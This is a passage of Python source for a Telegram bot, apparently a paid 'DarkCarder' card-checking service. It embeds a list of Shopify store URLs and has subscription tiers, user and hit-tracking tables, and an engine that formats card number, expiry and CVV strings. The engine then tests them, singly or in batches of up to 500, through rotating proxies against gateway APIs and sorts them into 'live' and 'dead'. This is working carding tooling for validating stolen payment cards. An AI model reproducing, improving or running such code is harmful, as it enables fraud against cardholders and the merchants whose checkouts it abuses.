    'https://ann-charles-company-store.myshopify.com',
    'https://getoffroam.com',
    'https://omwah.myshopify.com',
    'https://kingpop.myshopify.com',
    'https://baofengradio.com',
    'https://carolinevencilshop.myshopify.com',
    'https://elegatto-xxi.myshopify.com',
    'https://george-co-llc.myshopify.com',
    'https://capemadness.myshopify.com',
    'https://hanks-belts.myshopify.com',
    'https://area-by-anki-spets.myshopify.com',
    'https://the-sweet-designs-shoppe.myshopify.com',
    'https://inkdetroit.myshopify.com',
    'https://epic-cardboard-props.myshopify.com',
    'https://hobby-house-needleworks.myshopify.com',
    'https://modernfuel.com',
    'https://closeparent.myshopify.com',
    'https://worldhub26.myshopify.com',
    'https://tltfmfg.myshopify.com',
    'https://restomods.com',
    'https://bread-srsly.myshopify.com',
    'https://2monkey.myshopify.com',
    'https://gu-h-2.myshopify.com',
    'https://mei-cha.myshopify.com',
    'https://flyingbobbins.com',
    'https://sweetwaterscafe.myshopify.com',
    'https://black-lion-weaving.myshopify.com',
    'https://wintergreenbotanicals.myshopify.com',
    'https://speedcube.myshopify.com',
    'https://drdenese.myshopify.com',
    'https://dignity-nz.myshopify.com',
    'https://christian-catholic-media.myshopify.com',
    'https://godsonhogsnwhips.org',
    'https://mtlneedsweights.myshopify.com',
    'https://daehair.myshopify.com',
    'https://ayannadenise.myshopify.com',
    'https://lulufabrics.com',
    'https://mechelleandbloom.myshopify.com',
    'https://barbarapersing.com',
    'https://childperfume.myshopify.com',
    'https://greerchicago-2.myshopify.com',
    'https://sharetea-everett-online.myshopify.com',
    'https://editorskeys.com',
    'https://touchland.com'
]


# ═══════════════════════════════════════════════════════
# CUSTOM EMOJI + UI
# ═══════════════════════════════════════════════════════
E = {
    "crown": "5039727497143387500", "card": "5039623284056917259",
    "diamond": "5042050649248760772", "tools": "5042274086332400375",
    "cat": "5039653765439816618", "gear": "5341715473882955310",
    "cross": "6237864166879663987", "user": "6237927637906364256",
    "id": "6237822905128851025", "cal": "6147637448135414816",
    "globe": "5039895103947146186", "fire": "5041975203853239332",
    "star": "5278751923338490157", "warn": "4915853119839011973",
    "stop": "5456140674028019486", "gift": "6242135305697106689",
    "trash": "5042329873662609701", "search": "5388632425314140043",
    "fix": "5271604874419647061", "announce": "5424818078833715060",
    "support": "5040030395416969985", "pay": "5039539210072097557",
    "shopify": "5039531487720899631", "live": "5039844895779455925",
    "rocket": "5042328396193864923", "shield": "5042101437237036298",
}

def tg(k, fb="•"):
    eid = E.get(k, "")
    return f"<tg-emoji emoji-id='{eid}'>{fb}</tg-emoji>" if eid else fb

def btn(text, cb=None, url=None, emoji_key=None, style="primary"):
    d = {"text": text}
    if cb: d["callback_data"] = cb
    if url: d["url"] = url
    if emoji_key and emoji_key in E: d["icon_custom_emoji_id"] = E[emoji_key]
    if style: d["style"] = style
    return d

def back_btn(target="back_main"):
    return btn("𝗕𝗮𝗰𝗸", cb=target, emoji_key="stop", style="danger")

JOIN_TEXT = (
    f"<blockquote><b>{tg('warn','⚠️')} 𝗔𝗰𝗰𝗲𝘀𝘀 𝗥𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱</b>\n\n"
    f"<b>𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗼𝘂𝗿 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 & 𝗴𝗿𝗼𝘂𝗽.</b>\n\n"
    f"<b>{tg('live','✅')} 𝗧𝗮𝗽 𝗯𝘂𝘁𝘁𝗼𝗻𝘀 𝗯𝗲𝗹𝗼𝘄, 𝘁𝗵𝗲𝗻 𝗩𝗲𝗿𝗶𝗳??.</b></blockquote>"
)
PRICING_TEXT = (
    f"<b>┌── {tg('card','💳')} 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 𝗣𝗟𝗔𝗡𝗦 ──┐</b>\n\n"
    f"<b>{tg('tools','🛠️')} 𝗖𝗢𝗥𝗘</b>  ·  𝟳𝗱  ·  $𝟱\n"
    f"<b>{tg('star','⭐')} 𝗘𝗟𝗜𝗧𝗘</b>  ·  𝟭𝟱𝗱  ·  $𝟳\n"
    f"<b>{tg('crown','👑')} 𝗥𝗢𝗢𝗧</b>  ·  𝟯𝟬𝗱  ·  $𝟭𝟱\n"
    f"<b>└──────────────────┘</b>\n\n"
    f"<i>Full Shopify single + mass unlock.</i>"
)
GATES_TEXT = (
    f"<b>┌── {tg('announce','📢')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗚𝗔𝗧𝗘𝗦 ──┐</b>\n"
    f"<b>├ 𝗦𝗶𝗻𝗴𝗹𝗲 ➛</b> <code>/chk</code>\n"
    f"<b>├ 𝗠𝗮𝘀𝘀 ➛</b> <code>/mass</code>\n"
    f"<b>├ 𝗦𝗶𝘁𝗲𝘀 ➛</b> {len(SITES)} loaded\n"
    f"<b>├ 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ➛</b> {len(PROXIES)} loaded\n"
    f"<b>└ 𝗛𝗲𝗮𝗹𝘁𝗵 ➛</b> 𝟭𝟬𝟬%\n"
    f"<b>└──────────────────┘</b>"
)
PROXY_TEXT = (
    f"<b>┌── {tg('globe','🌐')} 𝗣𝗥𝗢𝗫𝗬 ──┐</b>\n\n"
    f"<b>{tg('fix','🔧')} /proxy host:port</b>\n"
    f"<b>{tg('search','🔍')} /checkproxy</b>\n"
    f"<b>{tg('trash','🗑️')} /clearproxy</b>\n"
    f"<b>├ 𝗕𝘂𝗶𝗹𝘁-𝗶𝗻 ➛</b> {len(PROXIES)} proxies\n"
    f"<b>└ /randproxy ➛</b> random built-in\n"
    f"<b>└──────────────────┘</b>"
)
ADMIN_TEXT = (
    f"<b>┌── {tg('crown','👑')} 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 ──┐</b>\n\n"
    f"<b>{tg('gear','⚙️')} 𝗔𝗣𝗜𝘀 · 𝗨𝘀𝗲𝗿𝘀 · 𝗦𝘁𝗮𝘁𝘀</b>\n"
    f"<b>{tg('announce','📢')} 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 · 𝗕𝗮𝗻</b>\n"
    f"<b>└──────────────────┘</b>"
)

def loading_caption(user):
    ul = f'<a href="tg://user?id={user.id}">{user.first_name}</a>'
    return (
        f"{tg('user','👤')} 𝗨𝘀𝗲𝗿 ➛ {ul}\n"
        f"{tg('id','🆔')} 𝗜𝗗 ➛ <code>{user.id}</code>\n"
        f"{tg('crown','👑')} 𝗔𝗰𝗰𝗲𝘀𝘀 ➛ <b>Loading…</b>\n"
        f"{tg('cal','📅')} 𝗝𝗼𝗶𝗻𝗲𝗱 ➛ <b>Loading…</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{tg('cat','🐈‍⬛')} 𝗗𝗲𝘃 ➛ <a href='https://t.me/DarkCarder05'>{OWNER_NAME}</a>"
    )

def full_caption(user, access, joined):
    ul = f'<a href="tg://user?id={user.id}">{user.first_name}</a>'
    return (
        f"{tg('user','👤')} 𝗨𝘀𝗲𝗿 ➛ {ul}\n"
        f"{tg('id','🆔')} 𝗜𝗗 ➛ <code>{user.id}</code>\n"
        f"{tg('crown','👑')} 𝗔𝗰𝗰𝗲𝘀𝘀 ➛ <b>{access}</b>\n"
        f"{tg('cal','📅')} 𝗝𝗼𝗶𝗻𝗲𝗱 ➛ <b>{joined}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{tg('cat','🐈‍⬛')} 𝗗𝗲𝘃 ➛ <a href='https://t.me/DarkCarder05'>{OWNER_NAME}</a>"
    )

MAIN_KB = {"inline_keyboard": [
    [btn(" 𝗖𝗵𝗲𝗰𝗸𝗲𝗿", "menu_gates", emoji_key="card"),
     btn(" 𝗕𝘂𝘆 𝗡𝗼𝘄", "menu_pricing", emoji_key="crown")],
    [btn(" 𝗨𝗽𝗱𝗮𝘁𝗲𝘀", url=CHANNEL_LINK, emoji_key="tools"),
     btn(" 𝗚𝗿𝗼𝘂𝗽", url=GROUP_LINK, emoji_key="cat")],
    [btn(" 𝗦𝘂𝗽𝗽𝗼𝗿𝘁", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}", emoji_key="support"),
     btn(" 𝗣𝗿𝗼𝘅𝘆", "menu_proxy", emoji_key="globe")],
]}
JOIN_KB = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="𝗝𝗼𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url=CHANNEL_LINK, icon_custom_emoji_id=E["tools"], style="primary"),
     InlineKeyboardButton(text="𝗝𝗼𝗶𝗻 𝗚𝗿𝗼𝘂𝗽", url=GROUP_LINK, icon_custom_emoji_id=E["cat"], style="primary")],
    [InlineKeyboardButton(text="𝗩𝗲𝗿𝗶𝗳𝘆 𝗝𝗼𝗶𝗻𝗲𝗱", callback_data="verify_membership", icon_custom_emoji_id=E["live"], style="success")],
])
PRICING_KB = {"inline_keyboard": [
    [btn(" 𝗣𝗮𝘆 𝗩𝗶𝗮 𝗖𝗿𝘆𝗽𝘁𝗼", "menu_payment", emoji_key="pay")],
    [btn(" 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}", emoji_key="support")],
    [back_btn()],
]}
GATES_KB = {"inline_keyboard": [
    [btn(" 𝗦𝗶𝗻𝗴𝗹𝗲", "info_single", emoji_key="shopify"),
     btn(" 𝗠𝗮𝘀𝘀", "info_mass", emoji_key="fire")],
    [btn(" 𝗚𝗮𝘁𝗲 𝗦𝘁𝗮𝘁𝘂𝘀", "gate_status", emoji_key="gear")],
    [back_btn()],
]}
PROXY_KB = {"inline_keyboard": [[back_btn()]]}
ADMIN_KB = {"inline_keyboard": [
    [btn(" 𝗔𝗣𝗜 𝗟𝗶𝘀𝘁", "admin_apis", emoji_key="gear"),
     btn(" 𝗔𝗱𝗱 𝗔𝗣𝗜", "admin_addapi", emoji_key="tools")],
    [btn(" 𝗨𝘀𝗲𝗿𝘀", "admin_users", emoji_key="user"),
     btn(" 𝗦𝘁𝗮𝘁𝘀", "admin_stats", emoji_key="star")],
    [btn(" 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁", "admin_broadcast", emoji_key="announce"),
     btn(" 𝗕𝗮𝗻", "admin_ban", emoji_key="warn")],
    [back_btn()],
]}

def plan_select_kb():
    return {"inline_keyboard": [
        [btn(" 𝗖𝗢𝗥𝗘 $𝟱", "buy_core", emoji_key="tools"),
         btn(" 𝗘𝗟𝗜𝗧𝗘 $𝟳", "buy_elite", emoji_key="star")],
        [btn(" 𝗥𝗢𝗢𝗧 $𝟭𝟱", "buy_root", emoji_key="crown")],
        [back_btn("menu_pricing")],
    ]}

def api_list_kb(apis):
    rows = []
    for a in apis:
        st = "🟢" if a["is_active"] else "🔴"
        rows.append([btn(f"{st} {a['name'][:22]}", f"admin_api_{a['id']}", emoji_key="gear")])
    rows.append([back_btn("admin_panel")])
    return {"inline_keyboard": rows}

# ═══════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                is_premium INTEGER DEFAULT 0, premium_until REAL DEFAULT 0,
                total_hits INTEGER DEFAULT 0, total_lives INTEGER DEFAULT 0,
                joined_at REAL, is_banned INTEGER DEFAULT 0, last_active REAL
            );
            CREATE TABLE IF NOT EXISTS apis (
                id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE, name TEXT,
                is_active INTEGER DEFAULT 1, added_by INTEGER, added_at REAL
            );
            CREATE TABLE IF NOT EXISTS hits (
                id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, card TEXT,
                status TEXT, gateway TEXT, response TEXT, created_at REAL
            );
        """)
        await db.commit()
        for url in DEFAULT_APIS:
            try:
                await db.execute(
                    "INSERT OR IGNORE INTO apis (url, name, is_active, added_at) VALUES (?,?,1,?)",
                    (url, url.split("//")[-1].split("/")[0], time.time()))
            except Exception:
                pass
        await db.commit()

async def ensure_user(uid, username=None, first_name=None):
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute("SELECT user_id FROM users WHERE user_id=?", (uid,))
        if not await cur.fetchone():
            await db.execute(
                "INSERT INTO users (user_id,username,first_name,joined_at,last_active) VALUES (?,?,?,?,?)",
                (uid, username or "", first_name or "", time.time(), time.time()))
        else:
            await db.execute(
                "UPDATE users SET username=?, first_name=?, last_active=? WHERE user_id=?",
                (username or "", first_name or "", time.time(), uid))
        await db.commit()

async def get_user(uid):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        cur = await db.execute("SELECT * FROM users WHERE user_id=?", (uid,))
        return await cur.fetchone()

async def is_premium(uid):
    if uid == OWNER_ID: return True
    u = await get_user(uid)
    return bool(u and u["is_premium"] and u["premium_until"] > time.time())

async def set_premium(uid, days):
    until = time.time() + days * 86400
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET is_premium=1, premium_until=? WHERE user_id=?", (until, uid))
        await db.commit()

async def ban_user(uid, ban=True):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET is_banned=? WHERE user_id=?", (1 if ban else 0, uid))
        await db.commit()

async def is_banned(uid):
    u = await get_user(uid)
    return bool(u and u["is_banned"])

async def add_hit(uid, card, status, gateway, response):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO hits (user_id,card,status,gateway,response,created_at) VALUES (?,?,?,?,?,?)",
            (uid, card, status, gateway, response, time.time()))
        if status in ("live", "approved", "charged"):
            await db.execute("UPDATE users SET total_hits=total_hits+1, total_lives=total_lives+1 WHERE user_id=?", (uid,))
        else:
            await db.execute("UPDATE users SET total_hits=total_hits+1 WHERE user_id=?", (uid,))
        await db.commit()

async def get_apis(active_only=True):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        q = "SELECT * FROM apis WHERE is_active=1 ORDER BY id" if active_only else "SELECT * FROM apis ORDER BY id"
        cur = await db.execute(q)
        return await cur.fetchall()

async def add_api(url, name=None, added_by=0):
    name = name or url.split("//")[-1].split("/")[0]
    async with aiosqlite.connect(DB_PATH) as db:
        try:
            await db.execute(
                "INSERT INTO apis (url,name,is_active,added_by,added_at) VALUES (?,?,1,?,?)",
                (url, name, added_by, time.time()))
            await db.commit()
            return True
        except Exception:
            return False

async def toggle_api(api_id):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE apis SET is_active=1-is_active WHERE id=?", (api_id,))
        await db.commit()

async def get_stats():
    async with aiosqlite.connect(DB_PATH) as db:
        tu = (await (await db.execute("SELECT COUNT(*) FROM users")).fetchone())[0]
        pu = (await (await db.execute("SELECT COUNT(*) FROM users WHERE is_premium=1 AND premium_until>?", (time.time(),))).fetchone())[0]
        th = (await (await db.execute("SELECT COUNT(*) FROM hits")).fetchone())[0]
        tl = (await (await db.execute("SELECT COUNT(*) FROM hits WHERE status IN ('live','approved','charged')")).fetchone())[0]
        aa = (await (await db.execute("SELECT COUNT(*) FROM apis WHERE is_active=1")).fetchone())[0]
        return {"total_users": tu, "premium_users": pu, "total_hits": th, "total_lives": tl, "active_apis": aa}

# ═══════════════════════════════════════════════════════
# SHOPIFY ENGINE
# ═══════════════════════════════════════════════════════
LIVE_KEYS = ("live", "approved", "charged", "success", "cvv match", "thank you", "payment_success")
DEAD_KEYS = ("dead", "declined", "failed", "insufficient", "incorrect", "invalid", "do not honor", "stolen", "lost card")
ERROR_KEYS = ("error", "timeout", "proxy", "captcha", "rate limit", "blocked")

def _parse_status(text: str) -> str:
    t = (text or "").lower()
    for k in LIVE_KEYS:
        if k in t: return "live"
    for k in DEAD_KEYS:
        if k in t: return "dead"
    for k in ERROR_KEYS:
        if k in t: return "error"
    return "unknown"

def _clean_card(raw: str) -> Optional[str]:
    raw = raw.strip().replace(" ", "").replace("/", "|")
    parts = re.split(r"[|:\s]+", raw)
    if len(parts) >= 4:
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = "20" + yy
        if len(mm) == 1: mm = "0" + mm
        if cc.isdigit() and 13 <= len(cc) <= 19 and mm.isdigit() and yy.isdigit() and cvv.isdigit():
            return f"{cc}|{mm}|{yy}|{cvv}"
    return None

async def _hit_one(session, api_url, card, proxy=None):
    result = {"api": api_url, "card": card, "status": "error", "response": "", "raw": ""}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json, text/plain, */*"}
    timeout = aiohttp.ClientTimeout(total=22)
    try:
        url = f"{api_url.rstrip('/')}?card={card}"
        async with session.get(url, headers=headers, timeout=timeout, proxy=proxy, ssl=False) as resp:
            text = await resp.text()
            result["raw"] = text[:800]
            result["response"] = text[:400]
            result["status"] = _parse_status(text)
            if result["status"] != "unknown":
                return result
    except Exception as e:
        result["response"] = str(e)[:200]
    try:
        async with session.post(api_url.rstrip("/"), json={"card": card, "cc": card}, headers=headers, timeout=timeout, proxy=proxy, ssl=False) as resp:
            text = await resp.text()
            result["raw"] = text[:800]
            result["response"] = text[:400]
            result["status"] = _parse_status(text)
            return result
    except Exception as e:
        result["response"] = str(e)[:200]
        result["status"] = "error"
    return result

async def check_card(card_raw, user_id, proxy=None):
    card = _clean_card(card_raw)
    if not card:
        return {"status": "error", "response": "Invalid format. Use: cc|mm|yyyy|cvv", "card": card_raw}
    apis = await get_apis(True)
    if not apis:
        return {"status": "error", "response": "No active Shopify APIs.", "card": card}
    if not proxy and PROXIES:
        proxy = random.choice(PROXIES)
    async with aiohttp.ClientSession() as session:
        for api in apis:
            res = await _hit_one(session, api["url"], card, proxy)
            if res["status"] in ("live", "dead"):
                await add_hit(user_id, card, res["status"], "shopify", res["response"])
                res["api_name"] = api["name"]
                return res
        await add_hit(user_id, card, "error", "shopify", res.get("response", ""))
        return res

async def mass_check(cards, user_id, proxy=None, progress_cb=None):
    cleaned = [c for c in (_clean_card(x) for x in cards) if c]
    if not cleaned:
        return []
    apis = await get_apis(True)
    if not apis:
        return [{"card": c, "status": "error", "response": "No APIs"} for c in cleaned]
    results = []
    sem = asyncio.Semaphore(8)

    async def worker(card, idx):
        async with sem:
            px = proxy or (random.choice(PROXIES) if PROXIES else None)
            async with aiohttp.ClientSession() as session:
                final = {"card": card, "status": "error", "response": "all failed", "api_name": "-"}
                for api in apis:
                    res = await _hit_one(session, api["url"], card, px)
                    if res["status"] in ("live", "dead"):
                        final = res
                        final["api_name"] = api["name"]
                        break
                    final = res
                    final["api_name"] = api["name"]
                await add_hit(user_id, card, final["status"], "shopify", final.get("response", ""))
                if progress_cb:
                    await progress_cb(idx + 1, len(cleaned), final)
                return final

    return await asyncio.gather(*[worker(c, i) for i, c in enumerate(cleaned)])

# ═══════════════════════════════════════════════════════
# BOT CORE
# ═══════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("DarkCarder")

def custom_dumps(obj, *a, **k):
    return json.dumps(obj, *a, **k)

session = AiohttpSession(json_dumps=custom_dumps)
bot = Bot(token=BOT_TOKEN, session=session, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

USER_PROXY: Dict[int, str] = {}
MASS_STOP: set = set()
_MEMBERSHIP_CACHE: Dict[int, tuple] = {}

async def check_membership(uid: int) -> bool:
    if uid == OWNER_ID: return True
    now = time.time()
    c = _MEMBERSHIP_CACHE.get(uid)
    if c and c[1] > now: return c[0]
    try:
        ch = await bot.get_chat_member(CHANNEL_ID, uid)
        gr = await bot.get_chat_member(GROUP_ID, uid)
        ok = ch.status in ("member", "administrator", "creator") and gr.status in ("member", "administrator", "creator")
    except Exception:
        ok = False
    _MEMBERSHIP_CACHE[uid] = (ok, now + (60 if ok else 15))
    return ok

def invalidate_membership(uid):
    _MEMBERSHIP_CACHE.pop(uid, None)

class MembershipMiddleware(BaseMiddleware):
    async def __call__(self, handler, event: Message, data):
        user = event.from_user
        if not user: return await handler(event, data)
        if user.id == OWNER_ID: return await handler(event, data)
        if event.text and event.text.lower().startswith("/start"):
            invalidate_membership(user.id)
        if await is_banned(user.id):
            await event.reply(f"{tg('cross','❌')} 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗯𝗮𝗻𝗻𝗲𝗱.")
            return
        if not await check_membership(user.id):
            await event.reply(JOIN_TEXT, reply_markup=JOIN_KB, disable_web_page_preview=True)
            return
        return await handler(event, data)

dp.message.middleware(MembershipMiddleware())

async def access_str(uid):
    if uid == OWNER_ID: return "𝗢𝘄𝗻𝗲𝗿 ∞"
    u = await get_user(uid)
    if not u: return "𝗙𝗿𝗲𝗲"
    if u["is_premium"] and u["premium_until"] > time.time():
        left = int((u["premium_until"] - time.time()) / 86400)
        return f"𝗣𝗿𝗲𝗺𝗶𝘂𝗺 ({left}𝗱)"
    return "𝗙𝗿𝗲𝗲"

async def joined_str(uid):
    u = await get_user(uid)
    if not u or not u["joined_at"]: return "—"
    return datetime.fromtimestamp(u["joined_at"]).strftime("%d %b %Y")

async def require_premium(message: Message) -> bool:
    if message.from_user.id == OWNER_ID: return True
    if await is_premium(message.from_user.id): return True
    await message.reply(
        f"{tg('warn','⚠️')} <b>𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱</b>\nTap Buy Now to unlock.",
        reply_markup={"inline_keyboard": [[btn(" 𝗕𝘂𝘆 𝗡𝗼𝘄", "menu_pricing", emoji_key="crown")]]})
    return False

# ── /start
@router.message(Command("start"))
async def cmd_start(message: Message):
    user = message.from_user
    await ensure_user(user.id, user.username, user.first_name)
    if message.text and len(message.text.split()) > 1 and message.text.split()[1] == "buy":
        await message.reply(PRICING_TEXT, reply_markup=PRICING_KB)
        return
    sent = await message.reply(loading_caption(user), reply_markup=MAIN_KB)
    try:
        await sent.edit_text(full_caption(user, await access_str(user.id), await joined_str(user.id)), reply_markup=MAIN_KB)
    except Exception:
        pass

@router.callback_query(F.data == "verify_membership")
async def cb_verify(callback: CallbackQuery):
    invalidate_membership(callback.from_user.id)
    if await check_membership(callback.from_user.id):
        await callback.answer("🎁 Verified! Full access unlocked.", show_alert=True)
        try: await callback.message.delete()
        except Exception: pass
        await ensure_user(callback.from_user.id, callback.from_user.username, callback.from_user.first_name)
        await callback.message.answer(
            full_caption(callback.from_user, await access_str(callback.from_user.id), await joined_str(callback.from_user.id)),
            reply_markup=MAIN_KB)
    else:
        await callback.answer(f"{tg('cross','❌')} Join channel + group first!", show_alert=True)

@router.callback_query()
async def cb_router(callback: CallbackQuery):
    data = callback.data or ""
    user = callback.from_user
    msg = callback.message
    await ensure_user(user.id, user.username, user.first_name)

    if data == "back_main":
        await callback.answer()
        try: await msg.edit_text(full_caption(user, await access_str(user.id), await joined_str(user.id)), reply_markup=MAIN_KB)
        except Exception: pass
        return
    if data == "menu_gates":
        await callback.answer()
        try: await msg.edit_text(GATES_TEXT, reply_markup=GATES_KB)
        except Exception: pass
        return
    if data == "menu_pricing":
        await callback.answer()
        try: await msg.edit_text(PRICING_TEXT, reply_markup=PRICING_KB)
        except Exception: pass
        return
    if data == "menu_proxy":
        await callback.answer()
        try: await msg.edit_text(PROXY_TEXT, reply_markup=PROXY_KB)
        except Exception: pass
        return
    if data == "menu_payment":
        await callback.answer()
        try: await msg.edit_text(f"<b>{tg('pay','💰')} 𝗦𝗲𝗹𝗲𝗰𝘁 𝗣𝗹𝗮𝗻</b>\nContact {OWNER_USERNAME} after pay.", reply_markup=plan_select_kb())
        except Exception: pass
        return
    if data == "info_single":
        await callback.answer()
        t = (f"<b>┌── {tg('gear','⚙️')} 𝗦𝗜𝗡𝗚𝗟𝗘 ──┐</b>\n"
             f"<b>├ /chk cc|mm|yyyy|cvv</b>\n"
             f"<b>├ Gateway ➛ Shopify</b>\n"
             f"<b>└ Premium required</b>\n<b>└──────────────┘</b>")
        try: await msg.edit_text(t, reply_markup={"inline_keyboard": [[back_btn("menu_gates")]]})
        except Exception: pass
        return
    if data == "info_mass":
        await callback.answer()
        t = (f"<b>┌── {tg('fire','🔥')} 𝗠𝗔𝗦𝗦 ──┐</b>\n"
             f"<b>├ /mass  (reply to list)</b>\n"
             f"<b>├ Limit ➛ 500 cards</b>\n"
             f"<b>├ Sites ➛ {len(SITES)}</b>\n"
             f"<b>└ Premium required</b>\n<b>└──────────────┘</b>")
        try: await msg.edit_text(t, reply_markup={"inline_keyboard": [[back_btn("menu_gates")]]})
        except Exception: pass
        return
    if data == "gate_status":
        await callback.answer()
        apis = await get_apis(False)
        lines = [f"<b>┌── {tg('gear','⚙️')} 𝗔𝗣𝗜 𝗦𝗧𝗔𝗧𝗨𝗦 ──┐</b>"]
        for a in apis:
            lines.append(f"<b>├ {'🟢' if a['is_active'] else '🔴'} {a['name'][:28]}</b>")
        lines.append(f"<b>├ Sites embedded ➛ {len(SITES)}</b>")
        lines.append(f"<b>├ Proxies embedded ➛ {len(PROXIES)}</b>")
        lines.append("<b>└──────────────────┘</b>")
        try: await msg.edit_text("\n".join(lines), reply_markup={"inline_keyboard": [[back_btn("menu_gates")]]})
        except Exception: pass
        return
    if data.startswith("buy_"):
        plan = data.replace("buy_", "")
        if plan in PLANS:
            p = PLANS[plan]
            await callback.answer()
            t = (f"<b>{tg('crown','👑')} {p['name']}</b>\n\n"
                 f"<b>├ {p['days']} days · ${p['price']}</b>\n"
                 f"<b>└ Pay then contact {OWNER_USERNAME}</b>")
            kb = {"inline_keyboard": [
                [btn(" 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}", emoji_key="support")],
                [back_btn("menu_payment")]]}
            try: await msg.edit_text(t, reply_markup=kb)
            except Exception: pass
        return
    if data in ("admin_panel", "admin_back"):
        if user.id != OWNER_ID:
            await callback.answer("Owner only.", show_alert=True); return
        await callback.answer()
        try: await msg.edit_text(ADMIN_TEXT, reply_markup=ADMIN_KB)
        except Exception: pass
        return
    if data == "admin_apis":
        if user.id != OWNER_ID: return
        await callback.answer()
        apis = await get_apis(False)
        text = f"<b>{tg('gear','⚙️')} 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗔𝗣𝗜𝘀</b>\nTap to toggle." if apis else f"{tg('warn','⚠️')} No APIs."
        try: await msg.edit_text(text, reply_markup=api_list_kb(apis) if apis else {"inline_keyboard": [[back_btn("admin_panel")]]})
        except Exception: pass
        return
    if data.startswith("admin_api_"):
        if user.id != OWNER_ID: return
        await toggle_api(int(data.split("_")[-1]))
        await callback.answer("Toggled ✅")
        try: await msg.edit_reply_markup(reply_markup=api_list_kb(await get_apis(False)))
        except Exception: pass
        return
    if data == "admin_stats":
        if user.id != OWNER_ID: return
        await callback.answer()
        s = await get_stats()
        t = (f"<b>┌── {tg('star','⭐')} 𝗦𝗧𝗔𝗧𝗦 ──┐</b>\n"
             f"<b>├ Users ➛ {s['total_users']}</b>\n"
             f"<b>├ Premium ➛ {s['premium_users']}</b>\n"
             f"<b>├ Hits ➛ {s['total_hits']}</b>\n"
             f"<b>├ Lives ➛ {s['total_lives']}</b>\n"
             f"<b>├ APIs ➛ {s['active_apis']}</b>\n"
             f"<b>├ Sites ➛ {len(SITES)}</b>\n"
             f"<b>├ Proxies ➛ {len(PROXIES)}</b>\n"
             f"<b>└────────────────┘</b>")
        try: await msg.edit_text(t, reply_markup={"inline_keyboard": [[back_btn("admin_panel")]]})
        except Exception: pass
        return
    if data == "admin_addapi":
        if user.id != OWNER_ID: return
        await callback.answer()
        try: await msg.edit_text(f"<b>{tg('tools','🛠️')} Add API</b>\n<code>/addapi https://gate/shopify</code>",
                                 reply_markup={"inline_keyboard": [[back_btn("admin_panel")]]})
        except Exception: pass
        return
    if data == "admin_users":
        if user.id != OWNER_ID: return
        await callback.answer()
        s = await get_stats()
        t = (f"<b>{tg('user','👤')} Users</b>\nTotal: <b>{s['total_users']}</b> · Premium: <b>{s['premium_users']}</b>\n\n"
             f"<code>/prem uid days</code>\n<code>/ban uid</code> · <code>/unban uid</code>")
        try: await msg.edit_text(t, reply_markup={"inline_keyboard": [[back_btn("admin_panel")]]})
        except Exception: pass
        return
    if data == "admin_broadcast":
        if user.id != OWNER_ID: return
        await callback.answer()
        try: await msg.edit_text(f"<b>{tg('announce','📢')} Broadcast</b>\n<code>/broad message</code>",
                                 reply_markup={"inline_keyboard": [[back_btn("admin_panel")]]})
        except Exception: pass
        return
    if data == "admin_ban":
        if user.id != OWNER_ID: return
        await callback.answer()
        try: await msg.edit_text(f"<b>{tg('warn','⚠️')} Ban</b>\n<code>/ban uid</code> · <code>/unban uid</code>",
                                 reply_markup={"inline_keyboard": [[back_btn("admin_panel")]]})
        except Exception: pass
        return
    await callback.answer()

# ── CHECKER
@router.message(Command("chk", "check", "cc"))
async def cmd_chk(message: Message):
    if not await require_premium(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.reply(f"{tg('card','💳')} <code>/chk 4532...|12|2028|123</code>")
        return
    proxy = USER_PROXY.get(message.from_user.id)
    status_msg = await message.reply(f"{tg('gear','⚙️')} <b>Checking…</b>")
    result = await check_card(parts[1].strip(), message.from_user.id, proxy)
    st = result.get("status", "error")
    icon = tg("live", "🟢") if st == "live" else (tg("cross", "🔴") if st == "dead" else tg("warn", "⚠️"))
